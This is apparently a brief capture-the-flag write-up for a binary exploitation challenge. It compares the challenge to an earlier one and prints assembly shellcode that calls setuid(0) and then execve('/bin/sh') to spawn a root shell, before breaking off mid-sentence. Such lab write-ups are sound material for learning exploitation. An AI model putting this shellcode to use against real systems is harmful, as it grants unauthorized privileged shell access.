![](./A%20Crafty%20Clobber%20Hard-1780626858877.webp)
![](./A%20Crafty%20Clobber%20Hard-1780626979558.webp)
inspecting the pseudo code and the vmmap, we acknowledge that this challenge is a copy of [Canary Conundrum Hard](Canary%20Conundrum%20Hard.md) with an extra checker at the end
this means 2 things:
	1. The solution is almost the same as [Canary Conundrum Hard](Canary%20Conundrum%20Hard.md)
	2. we have 0x28 bytes for our setuid and shell-spawning code (see the location of buf and v10)
```
payload = asm("""
xor rdi, rdi
mov rax, 105
syscall
mov rdi, 0x68732f6e69622f
push rdi
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
syscall
""")
```
looking at the old code, we acknowledge that we wasted space for 'mov' instead 